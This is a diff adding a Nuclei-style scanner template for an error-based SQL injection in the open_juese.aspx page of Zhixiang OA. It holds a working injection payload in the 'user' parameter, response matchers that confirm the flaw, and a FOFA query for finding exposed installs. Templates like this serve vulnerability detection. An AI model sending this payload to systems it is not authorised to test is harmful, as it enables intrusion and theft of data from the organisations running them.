@@ -1,0 +1,29 @@
+id: zhixiang-oa-open-juese-sqli
+
+info:
+  name: Zhixiang OA open_juese.aspx - SQL injection
+  author: qwtd
+  severity: high
+  description: There is a SQL injection vulnerability in the open_juese.aspx file of Zhixiang OA. Attackers can obtain sensitive information through the vulnerability.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="致翔软件-致翔OA"
+  tags: 致翔软件-致翔OA
+
+http:
+  - raw:
+      - |
+        GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SqlException"
+          - "nvarchar"
+        condition: and
